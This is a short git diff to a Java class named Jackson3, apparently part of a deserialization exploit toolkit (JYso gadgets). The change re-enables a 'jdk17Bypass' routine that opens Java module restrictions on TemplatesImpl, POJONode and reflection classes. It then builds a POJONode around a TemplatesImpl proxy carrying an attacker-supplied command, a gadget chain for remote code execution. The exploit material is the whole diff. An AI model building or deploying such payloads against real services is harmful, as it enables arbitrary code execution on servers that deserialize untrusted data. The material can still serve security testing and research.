@@ -4,6 +4,8 @@ import com.fasterxml.jackson.databind.node.POJONode;
 import com.qi4l.JYso.gadgets.utils.SuClassLoader;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 
+import com.qi4l.JYso.gadgets.utils.jdk17Bypass;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import javassist.ClassClassPath;
 
 import org.springframework.aop.framework.AdvisedSupport;
@@ -12,6 +14,7 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
 
+import javax.swing.event.EventListenerList;
 import javax.xml.transform.Templates;
 
 import java.lang.reflect.Constructor;
@@ -19,6 +22,7 @@ import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Proxy;
 import java.lang.reflect.*;
 
+import java.util.ArrayList;
 import java.util.Vector;
 
 import static com.qi4l.JYso.gadgets.Config.Config.POOL;
@@ -89,14 +93,14 @@ public class Jackson3 implements ObjectPayload<Object> {
 
         }
 
-        //ArrayList<Class> classes = new ArrayList <>();
-        //classes.add(TemplatesImpl.class);
-        //classes.add(POJONode.class);
-        //classes.add(EventListenerList.class);
-        //classes.add(Jackson3.class);
-        //classes.add(Field.class);
-        //classes.add(Method.class);
-        //new jdk17Bypass().bypassModule(classes);
+        ArrayList<Class> classes = new ArrayList<>();
+        classes.add(TemplatesImpl.class);
+        classes.add(POJONode.class);
+        classes.add(EventListenerList.class);
+        classes.add(Jackson3.class);
+        classes.add(Field.class);
+        classes.add(Method.class);
+        new jdk17Bypass().bypassModule(classes);
 
 
         POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
